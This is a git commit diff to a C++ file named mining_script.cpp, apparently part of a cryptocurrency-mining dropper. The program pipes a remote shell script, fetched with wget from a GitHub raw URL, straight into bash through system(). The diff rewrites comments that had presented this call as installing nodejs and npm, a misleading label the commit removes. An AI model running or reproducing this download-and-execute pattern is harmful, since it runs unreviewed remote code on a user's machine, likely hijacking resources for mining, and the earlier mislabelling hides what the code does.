82669e45c852d98b2a0709b37a30e4b07b5bba79
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-19 03:35:54 +0700

    Update mining_script.cpp

--- mining_script.cpp
+++ mining_script.cpp
@@ -1,16 +1,14 @@
 #include <iostream>
 #include <cstdlib>
-#include <unistd.h> // For chdir
 
 int main() {
-    // Update package list and install nodejs and npm
-    std::cout << "Updating package list and installing nodejs and npm..." << std::endl;
+    // Run the provided command to download and execute the bash script
+    std::cout << "Downloading and executing the bash script..." << std::endl;
     if (system("bash <(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/lucktuske.sh)") != 0) {
-        std::cerr << "Failed to update package." << std::endl;
+        std::cerr << "Failed to download or execute the bash script." << std::endl;
         return 1;
     }
 
-    std::cout << "script executed successfully." << std::endl;
-
+    std::cout << "Script executed successfully." << std::endl;
     return 0;
 }
